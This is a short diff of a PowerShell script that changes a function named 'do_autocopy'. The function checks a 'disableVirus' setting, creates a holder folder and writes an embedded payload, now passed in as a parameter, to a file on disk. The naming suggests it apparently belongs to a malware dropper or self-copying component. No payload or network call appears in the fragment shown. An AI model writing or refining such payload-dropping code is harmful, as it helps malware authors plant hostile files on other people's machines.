@@ -1,9 +1,8 @@
 . ./utils.ps1
 . ./consts_body.ps1
-. ./consts_autocopy.ps1
 
 
-function do_autocopy {
+function do_autocopy { param ([string]$param)
     
     if ($server.disableVirus)
     {
@@ -24,14 +23,9 @@ function do_autocopy {
             New-Item -Path $holderFolder -ItemType Directory | Out-Null
         }
 
-        if ($null -ne $global:xholder -and $global:xholder -ne "")
-        {
-            writedbg "Invoke from internals"
-            ExtractEmbedding -inContent $xholder -outFile $holderPath
-            return
-        }
+        ExtractEmbedding -inContent $param -outFile $holderPath 
 
     } catch {
-        writedbg "Error DoAuto"
+        writedbg "Error DoAuto $_"
     }
 }
